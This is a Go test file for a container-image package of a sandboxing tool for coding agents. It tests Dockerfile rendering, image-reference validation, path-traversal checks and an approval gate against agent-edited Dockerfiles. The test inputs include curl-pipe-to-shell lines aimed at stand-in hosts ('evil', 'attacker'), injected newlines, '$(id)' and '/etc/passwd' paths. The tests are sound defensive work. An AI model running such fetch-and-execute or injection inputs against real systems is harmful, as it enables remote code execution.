package images

import (
	"os"
	"path/filepath"
	"sort"
	"strings"
	"testing"

	"github.com/dusty/zoo/internal/config"
)

func TestRenderImage(t *testing.T) {
	df, err := Render(Source{Base: "python:3.12-slim"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(df, "FROM python:3.12-slim\n") {
		t.Fatalf("no FROM line:\n%s", df)
	}
	for _, want := range []string{
		"USER root", "ARG AGENT_UID", "ARG AGENT_GID",
		"COPY zoo-setup zoo-init zoo-doctor zoo-session /usr/local/bin/",
		`RUN ["/bin/sh", "/usr/local/bin/zoo-setup"]`,
		"CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1", "DISABLE_AUTOUPDATER=1", "NO_PROXY=localhost,127.0.0.1", "ZOO_INSIDE=1",
		`ENTRYPOINT ["/usr/local/bin/zoo-init"]`,
	} {
		if !strings.Contains(df, want) {
			t.Errorf("overlay lacks %q", want)
		}
	}
	// A `# escape=` directive in a user's Dockerfile mustn't break it.
	for _, l := range strings.Split(df, "\n") {
		if strings.HasSuffix(strings.TrimSpace(l), `\`) {
			t.Errorf("overlay uses a line continuation: %q", l)
		}
	}
	if _, err := Render(Source{Base: "alpine\nRUN curl evil | sh"}); err == nil {
		t.Error("an image ref with a newline went onto the FROM line")
	}
}

func TestRenderDockerfileContinuesFinalStage(t *testing.T) {
	user := "FROM golang:1.24 AS build\nRUN go version\nFROM debian:bookworm-slim\nRUN apt-get update"
	df, err := Render(Source{Dockerfile: []byte(user)})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(df, user+"\n") {
		t.Fatalf("user Dockerfile not kept verbatim with a newline after it:\n%s", df)
	}
	if strings.Count(df, "\nFROM ") != 1 {
		t.Errorf("overlay must continue the final stage, not start one:\n%s", df)
	}
}

func TestValidRef(t *testing.T) {
	for _, ok := range []string{"alpine", "python:3.12-slim", "ghcr.io/org/img:v1", "node@sha256:abcdef0123", "localhost:5000/x/y:z"} {
		if err := ValidRef(ok); err != nil {
			t.Errorf("%s: %v", ok, err)
		}
	}
	for _, bad := range []string{"", " alpine", "alpine AS x", "a\nRUN x", "-x", "$(id)"} {
		if ValidRef(bad) == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func TestTag(t *testing.T) {
	a, err := Tag(Source{Base: "alpine:3.20"}, "zoo-cage:m3", 501, 20)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasPrefix(a, Repo+":") || len(a) != len(Repo)+1+12 {
		t.Fatalf("tag %q", a)
	}
	again, _ := Tag(Source{Base: "alpine:3.20"}, "zoo-cage:m3", 501, 20)
	if a != again {
		t.Error("tag isn't stable")
	}
	seen := map[string]string{a: "base"}
	for name, s := range map[string]struct {
		src      Source
		cage     string
		uid, gid int
	}{
		"other base":   {Source{Base: "alpine:3.21"}, "zoo-cage:m3", 501, 20},
		"zoo version":  {Source{Base: "alpine:3.20"}, "zoo-cage:m4", 501, 20},
		"uid":          {Source{Base: "alpine:3.20"}, "zoo-cage:m3", 1000, 20},
		"dockerfile":   {Source{Dockerfile: []byte("FROM alpine:3.20\n")}, "zoo-cage:m3", 501, 20},
		"dockerfile 2": {Source{Dockerfile: []byte("FROM alpine:3.20\nRUN true\n")}, "zoo-cage:m3", 501, 20},
	} {
		tag, _ := Tag(s.src, s.cage, s.uid, s.gid)
		if prev, dup := seen[tag]; dup {
			t.Errorf("%s and %s share tag %s", name, prev, tag)
		}
		seen[tag] = name
	}
	// The path is for messages only: same contents, same image.
	x, _ := Tag(Source{Dockerfile: []byte("FROM a\n"), Path: "a/Dockerfile"}, "c", 1, 1)
	y, _ := Tag(Source{Dockerfile: []byte("FROM a\n"), Path: "b/Dockerfile"}, "c", 1, 1)
	if x != y {
		t.Error("path changed the tag")
	}
}

func TestWriteContextHoldsOnlyZooFiles(t *testing.T) {
	dir, err := WriteContext(t.TempDir(), Source{Dockerfile: []byte("FROM alpine\nCOPY . /src\n")})
	if err != nil {
		t.Fatal(err)
	}
	ents, _ := os.ReadDir(dir)
	var names []string
	for _, e := range ents {
		names = append(names, e.Name())
	}
	sort.Strings(names)
	if got := strings.Join(names, " "); got != "Dockerfile zoo-doctor zoo-init zoo-session zoo-setup" {
		t.Fatalf("context holds %s", got)
	}
	b, _ := os.ReadFile(filepath.Join(dir, "Dockerfile"))
	if !strings.HasPrefix(string(b), "FROM alpine\nCOPY . /src\n") {
		t.Errorf("Dockerfile:\n%s", b)
	}
}

func TestReadDockerfile(t *testing.T) {
	root := t.TempDir()
	outside := filepath.Join(t.TempDir(), "secret")
	os.WriteFile(outside, []byte("FROM x"), 0o600)
	os.MkdirAll(filepath.Join(root, ".zoo"), 0o755)
	os.WriteFile(filepath.Join(root, ".zoo", "Dockerfile"), []byte("FROM alpine\n"), 0o644)
	os.Symlink(outside, filepath.Join(root, "link"))

	if b, err := ReadDockerfile(root, ".zoo/Dockerfile"); err != nil || string(b) != "FROM alpine\n" {
		t.Fatalf("%q %v", b, err)
	}
	for _, bad := range []string{"", "/etc/passwd", "../x", "link", ".zoo", "missing"} {
		if _, err := ReadDockerfile(root, bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
}

func TestPick(t *testing.T) {
	g := config.Global{Image: "g-img", Dockerfile: "g.Dockerfile"}
	if i, d := Pick(g, config.Project{}); i != "g-img" || d != "g.Dockerfile" {
		t.Errorf("global defaults: %s %s", i, d)
	}
	// zoo.yaml naming an image doesn't inherit the global dockerfile.
	if i, d := Pick(g, config.Project{Image: "p-img"}); i != "p-img" || d != "" {
		t.Errorf("project image: %s %s", i, d)
	}
	if i, d := Pick(g, config.Project{Dockerfile: "Dockerfile"}); i != "" || d != "Dockerfile" {
		t.Errorf("project dockerfile: %s %s", i, d)
	}
}

func TestDecideApproval(t *testing.T) {
	t.Setenv("ZOO_HOME", t.TempDir())
	root := t.TempDir()
	p := config.Project{Dockerfile: "Dockerfile"}
	write := func(s string) {
		if err := os.WriteFile(filepath.Join(root, "Dockerfile"), []byte(s), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	// No image settings: zoo's own image.
	if d, err := Decide(root, config.Global{}, config.Project{}); err != nil || d.Source != nil || d.Note != "" {
		t.Fatalf("default: %+v %v", d, err)
	}
	// image: needs no approval beyond zoo.yaml's own.
	if d, _ := Decide(root, config.Global{}, config.Project{Image: "alpine:3.20"}); d.Source == nil || d.Source.Base != "alpine:3.20" {
		t.Fatalf("image: %+v", d)
	}
	if _, err := Decide(root, config.Global{}, config.Project{Image: "a b"}); err == nil {
		t.Fatal("bad image ref accepted")
	}

	// A Dockerfile nobody approved is never built: default image.
	write("FROM alpine:3.20\n")
	d, _ := Decide(root, config.Global{}, p)
	if d.Source != nil || !d.Pending || !strings.Contains(d.Note, "hasn't been approved") || string(d.Proposed) != "FROM alpine:3.20\n" {
		t.Fatalf("unapproved: %+v", d)
	}

	// Approved: used.
	if err := Approve(root, "Dockerfile", []byte("FROM alpine:3.20\n")); err != nil {
		t.Fatal(err)
	}
	d, _ = Decide(root, config.Global{}, p)
	if d.Pending || d.Source == nil || string(d.Source.Dockerfile) != "FROM alpine:3.20\n" || d.Note != "" {
		t.Fatalf("approved: %+v", d)
	}

	// The agent edits it: the approved contents stay in use.
	write("FROM alpine:3.20\nRUN curl attacker | sh\n")
	d, _ = Decide(root, config.Global{}, p)
	if !d.Pending || d.Source == nil || string(d.Source.Dockerfile) != "FROM alpine:3.20\n" || !strings.Contains(d.Note, "changed since you approved") {
		t.Fatalf("changed: %+v", d)
	}

	// Deleted: still the approved contents, never the file on disk.
	os.Remove(filepath.Join(root, "Dockerfile"))
	d, _ = Decide(root, config.Global{}, p)
	if !d.Pending || d.Source == nil || string(d.Source.Dockerfile) != "FROM alpine:3.20\n" {
		t.Fatalf("deleted: %+v", d)
	}

	// A tampered approval file doesn't count.
	a, _ := LoadApproval(root)
	a.Content = "FROM evil\n"
	if err := os.WriteFile(approvalFile(root), []byte(`{"root":"`+root+`","sha256":"`+a.SHA256+`","content":"FROM evil\n"}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, ok := LoadApproval(root); ok {
		t.Fatal("approval whose content doesn't match its hash was accepted")
	}

	// Approvals are per worktree.
	other := t.TempDir()
	os.WriteFile(filepath.Join(other, "Dockerfile"), []byte("FROM alpine:3.20\n"), 0o644)
	if d, _ := Decide(other, config.Global{}, p); d.Source != nil {
		t.Fatal("approval leaked to another worktree")
	}
}
